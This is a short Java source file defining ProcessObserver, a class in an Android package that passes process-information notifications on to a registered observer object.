package com.android.dvci.module;

import com.android.dvci.ProcessInfo;
import com.android.dvci.event.BaseEvent;
import com.android.dvci.interfaces.IProcessObserver;
import com.android.dvci.interfaces.Observer;

public class ProcessObserver implements Observer<ProcessInfo> {

	private IProcessObserver observer = null;


	public ProcessObserver(IProcessObserver observer) {
		this.observer = observer;
	}

	@Override
	public int notification(ProcessInfo b) {
		if(observer != null){
			observer.notifyProcess(b);
		}
		return 0;
	}

}
